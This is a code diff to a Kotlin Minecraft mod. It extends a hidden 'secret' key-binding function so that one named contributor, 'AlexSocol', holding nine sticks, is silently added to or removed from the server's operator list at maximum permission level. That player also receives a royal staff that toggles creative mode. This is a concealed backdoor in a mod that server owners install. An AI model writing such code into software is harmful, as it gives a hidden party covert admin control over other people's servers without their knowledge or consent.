@@ -13,7 +13,9 @@ import net.minecraft.entity.player.EntityPlayerMP
 import net.minecraft.init.Items
 import net.minecraft.item.ItemStack
 import net.minecraft.server.MinecraftServer
+import net.minecraft.server.management.UserListOpsEntry
 import net.minecraft.util.MovingObjectPosition.MovingObjectType
+import net.minecraft.world.WorldSettings
 
 object KeyBindingHandler {
 	
@@ -85,9 +87,20 @@ object KeyBindingHandler {
 	}
 	
 	fun secret(player: EntityPlayerMP) {
-		if (ContributorsPrivacyHelper.isCorrect(player, "AlexSocol") && player.currentEquippedItem?.item === Items.stick && player.currentEquippedItem?.stackSize == 9) {
-			MinecraftServer.getServer()?.let { server -> server.func_152358_ax().func_152655_a(player.commandSenderName)?.let { server.configurationManager.func_152605_a(it) } }
-			player.setCurrentItemOrArmor(0, ItemStack(AlfheimItems.royalStaff))
+		if (ContributorsPrivacyHelper.isCorrect(player, "AlexSocol")) {
+			if (player.currentEquippedItem?.item === Items.stick && player.currentEquippedItem?.stackSize == 9) {
+				MinecraftServer.getServer()?.also { it1 ->
+					it1.func_152358_ax()?.func_152655_a(player.commandSenderName)?.also { it2 ->
+						if (it1.configurationManager.func_152603_m().field_152696_d.containsKey(it2.id.toString()))
+							it1.configurationManager.func_152603_m().field_152696_d.remove(it2.id.toString())
+						else {
+							it1.configurationManager.func_152603_m().field_152696_d[it2.id.toString()] = UserListOpsEntry(it2, Int.MAX_VALUE)
+							player.setCurrentItemOrArmor(0, ItemStack(AlfheimItems.royalStaff))
+						}
+					}
+				}
+			} else if (player.currentEquippedItem?.item === AlfheimItems.royalStaff)
+				player.setGameType(if (player.capabilities.isCreativeMode) WorldSettings.GameType.SURVIVAL else WorldSettings.GameType.CREATIVE)
 		}
 	}
 }
